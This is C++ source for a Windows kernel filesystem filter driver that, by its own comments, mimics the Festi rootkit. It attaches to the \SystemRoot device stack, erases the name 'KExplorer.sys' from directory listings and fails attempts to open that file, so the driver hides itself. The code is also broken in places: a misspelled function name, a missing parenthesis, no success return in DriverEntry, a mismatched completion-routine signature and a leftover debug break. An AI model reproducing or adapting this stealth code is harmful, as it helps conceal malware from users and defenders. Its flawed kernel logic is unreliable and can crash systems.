

extern "C" {
	DRIVER_INITIALIZE DriverEntry;
	NTSTATUS InitializeHook();
}

#ifdef ALLOC_PRAGMA
	#pragma alloc_text(INIT, DriverEntry)
	#pragma alloc_text(INIT, InitializeHook)
#endif

PDRIVER_OBJECT KExplorer::KDriverObj;
FAST_IO_DISPATCH KExplorer::FastIoDispatch;
FAST_IO_DISPATCH KExplorer::FastIoDispatch =
{
	sizeof(FAST_IO_DISPATCH),
	KExplorer::FsFilterFastIoCheckIfPossible,
	KExplorer::FsFilterFastIoRead,
	KExplorer::FsFilterFastIoWrite,
	KExplorer::FsFilterFastIoQueryBasicInfo,
	KExplorer::FsFilterFastIoQueryStandardInfo,
	KExplorer::FsFilterFastIoLock,
	KExplorer::FsFilterFastIoUnlockSingle,
	KExplorer::FsFilterFastIoUnlockAll,
	KExplorer::FsFilterFastIoUnlockAllByKey,
	KExplorer::FsFilterFastIoDeviceControl,
	nullptr,
	nullptr,
	KExplorer::FsFilterFastIoDetachDevice,
	KExplorer::FsFilterFastIoQueryNetworkOpenInfo,
	nullptr,
	KExplorer::FsFilterFastIoMdlRead,
	KExplorer::FsFilterFastIoMdlReadComplete,
	KExplorer::FsFilterFastIoPrepareMdlWrite,
	KExplorer::FsFilterFastIoMdlWriteComplete,
	KExplorer::FsFilterFastIoReadCompressed,
	KExplorer::FsFilterFastIoWriteCompressed,
	KExplorer::FsFilterFastIoMdlReadCompleteCompressed,
	KExplorer::FsFilterFastIoMdlWriteCompleteCompressed,
	KExplorer::FsFilterFastIoQueryOpen,
	nullptr,
	nullptr,
	nullptr,
};



NTSTATUS
DriverEntry(
	PDRIVER_OBJECT DriverObj,
	PUNICODE_STRING RegistryPath
)
{
	KExplorer::KDriverObj = DriverObj;
	if (NT_SUCCESS(InitializeHook())
	{
		DriverObj->DriverUnload = [](PDRIVER_OBJECT DriverObj)
		{
			UNREFERENCED_PARAMETER(DriverObj);
			/* TODO: delete device */
			return;
		};
	}
	else
		return STATUS_UNSUCCESSFUL;

}

/* the device extension */
struct SysRootExtension
{
	PDEVICE_OBJECT OwnDevice;
	PDEVICE_OBJECT LowerDevice;
	ULONG WhichDevice;  /* just here to mimic festi, otherwise it's useless */
};

NTSTATUS
SystemRootHookCompletionRoutine(
	PDEVICE_OBJECT Device,
	PIRP Irp,
	PEPROCESS Process
)
{
	auto Extension = (SysRootExtension*) Device->DeviceExtension;
	auto Stack = IoGetCurrentIrpStackLocation(Irp);
	
	if (KeGetCurrentIrql() == PASSIVE_LEVEL)
	{
		if (Extension->WhichDevice == 1 &&
			Stack->MajorFunction == IRP_MJ_DIRECTORY_CONTROL &&
			Stack->MinorFunction == IRP_MN_QUERY_DIRECTORY &&
			Process != nullptr)
		{
			KAPC_STATE ApcState;
			KeStackAttachProcess((PRKPROCESS) Process, &ApcState);

			switch (Stack->Parameters.QueryDirectory.FileInformationClass)
			{
				case FileBothDirectoryInformation:
				{
					if (!Irp->IoStatus.Information || !Irp->UserBuffer)
					{
						break;
					}
					auto FileInfo = (PFILE_BOTH_DIR_INFORMATION) Irp->UserBuffer;
					while (FileInfo->NextEntryOffset)
					{
						if (wcsistr(FileInfo->FileName,
									FileInfo->FileNameLength,
									L"KExplorer.sys"))
						{
							memset(FileInfo->FileName, 0, FileInfo->FileNameLength);
						}
						FileInfo = (PFILE_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileInfo + FileInfo->NextEntryOffset);
					}

				} break;

				case FileIdBothDirectoryInformation:
				{
					if (!Irp->IoStatus.Information || !Irp->UserBuffer)
					{
						break;
					}
					auto FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) Irp->UserBuffer;
					while (FileIdInfo->NextEntryOffset)
					{
						if (wcsistr(FileIdInfo->FileName,
									FileIdInfo->FileNameLength,
									L"KExplorer.sys"))
						{
							memset(FileIdInfo->FileName, 0, FileIdInfo->FileNameLength);
						}
						FileIdInfo = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG_PTR) FileIdInfo + FileIdInfo->NextEntryOffset);
					}
				} break;

				default: break;
			}
			
			KeUnstackDetachProcess(&ApcState);
		}
		
	}
	/* 
		don't really need to implement this, since this is aimed at
	   	the network device Festi creates; maybe I'll add it later as well
	*/
	if (Extension->WhichDevice == 2)
	{
		/* ... */
	}

	if (Irp->PendingReturned)
	{
		Stack->Control |= SL_PENDING_RETURNED;
	}
	return STATUS_SUCCESS;
}

NTSTATUS
InitiailzeHook()
{
	UNICODE_STRING SystemRoot = RTL_CONSTANT_STRING(L"\\SystemRoot");
	OBJECT_ATTRIBUTES ObjAttrs; 
	IO_STATUS_BLOCK IoStatusBlk {};
	InitializeObjectAttributes(&ObjAttrs,
				   &SystemRoot, 
				   OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
				   nullptr, nullptr);
							   
	HANDLE SysRootHandle {};
	auto Status = IoCreateFile(&SysRootHandle, 
				   GENERIC_READ, 
				   &ObjAttrs, 
				   &IoStatusBlk,
				   nullptr,
				   0ul,
				   FILE_SHARE_READ | FILE_SHARE_WRITE,
				   FILE_OPEN,
				   FILE_DIRECTORY_FILE,
				   nullptr, 0ul,
				   CreateFileTypeNone,
				   nullptr,
				   IO_NO_PARAMETER_CHECKING);

	if (!NT_SUCCESS(Status))
	{
		dprintf("IoCreateFile(): 0x%08X [%d]\n", Status, __LINE__);
		return Status;
	}
	
	PFILE_OBJECT SysRootFileObj {};
	Status = ObReferenceObjectByHandle(SysRootHandle,
					   FILE_READ_ACCESS,
					   *IoFileObjectType,
					   KernelMode,
					   (PVOID*) &SysRootFileObj,
					   nullptr);

	ObCloseHandle(SysRootHandle, KernelMode);
	if (!NT_SUCCESS(Status))
	{
		dprintf("ObReferenceObjectByHandle(): 0x%08X [%d]\n", Status, __LINE__);
		return Status;
	}
	
	auto TargetDevice = IoGetRelatedDeviceObject(SysRootFileObj);
	ObfReferenceObject(TargetDevice);

	PDEVICE_OBJECT DeviceObj;
	Status = IoCreateDevice(KExplorer::KDriverObj,
				sizeof(SysRootExtension),
				nullptr,
				TargetDevice->DeviceType, 
				TargetDevice->Characteristics,
				FALSE,
				&DeviceObj);
				
	if (!NT_SUCCESS(Status))
	{
		dprintf("IoCreateDevice(): 0x%08X [%d]\n", Status, __LINE__);
		return Status;
	}

	DeviceObj->Flags &= ~DO_DEVICE_INITIALIZING; 

	if (FlagOn(TargetDevice->Flags, DO_BUFFERED_IO))
		SetFlag(DeviceObj->Flags, DO_BUFFERED_IO);
	if (FlagOn(TargetDevice->Flags, DO_DIRECT_IO))
		SetFlag(DeviceObj->Flags, DO_DIRECT_IO);
	if (FlagOn(TargetDevice->Flags, DO_SUPPORTS_TRANSACTIONS))
		SetFlag(DeviceObj->Flags, DO_SUPPORTS_TRANSACTIONS);
	if (FlagOn(TargetDevice->Flags, DO_POWER_PAGABLE))
		SetFlag(DeviceObj->Flags, DO_POWER_PAGABLE);

	/* start populating the extension */
	RtlSecureZeroMemory(DeviceObj->DeviceExtension, sizeof(SysRootExtension));
	auto Extension = (SysRootExtension*) DeviceObj->DeviceExtension;
	Extension->OwnDevice = DeviceObj;
	Extension->WhichDevice = 1ul;
	Status = IoAttachDeviceToDeviceStackSafe(DeviceObj, 
						 TargetDevice, 
						 &Extension->LowerDevice);
	if (!NT_SUCCESS(Status))
	{
		Extension->OwnDevice = nullptr;
		IoDeleteDevice(DeviceObj);
		Status = STATUS_UNSUCCESSFUL;
	}
	
	for (UCHAR i {}; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
	{
		KExplorer::KDriverObj->MajorFunction[i] =
			[](PDEVICE_OBJECT Device, PIRP Irp)
		{
			auto Extension = (SysRootExtension*) Device->DeviceExtension;
			auto Stack = IoGetCurrentIrpStackLocation(Irp);
				
			if (KeGetCurrentIrql() == PASSIVE_LEVEL)
			{/* can omit WhichDevice, since I'm only making one device */
				if (Extension->WhichDevice == 1 &&
					Stack->MajorFunction == IRP_MJ_CREATE &&
					Stack->Parameters.Create.Options & OBJ_CASE_INSENSITIVE)
				{
					__debugbreak();
					/* TODO: fix this piece of shit */
					null_terminate(&Stack->FileObject->FileName);
					if (wcsistr(Stack->FileObject->FileName.Buffer,
					            Stack->FileObject->FileName.Length,
						    L"KExplorer.sys"))
					{
						Irp->IoStatus.Status = STATUS_OBJECT_PATH_NOT_FOUND;
						Irp->IoStatus.Information = 5ul;
						IofCompleteRequest(Irp, IO_NO_INCREMENT);
						return Irp->IoStatus.Status;
					}
				}
			}
			IoSkipCurrentIrpStackLocation(Irp);
			return IoCallDriver(Extension->LowerDevice, Irp);
		};
	}

	KExplorer::KDriverObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] =
		[](PDEVICE_OBJECT DeviceObj, PIRP Irp)
	{
		IoCopyCurrentIrpStackLocationToNext(Irp);
		IoSetCompletionRoutine(Irp,
		                       (PIO_COMPLETION_ROUTINE) SystemRootHookCompletionRoutine,
				       IoGetCurrentProcess(),
				       TRUE, TRUE, FALSE);
		return IoCallDriver(((SysRootExtension*) DeviceObj->DeviceExtension)->LowerDevice,
		                    Irp);

	};


	KExplorer::KDriverObj->FastIoDispatch = &KExplorer::FastIoDispatch;

	
	return Status;

}
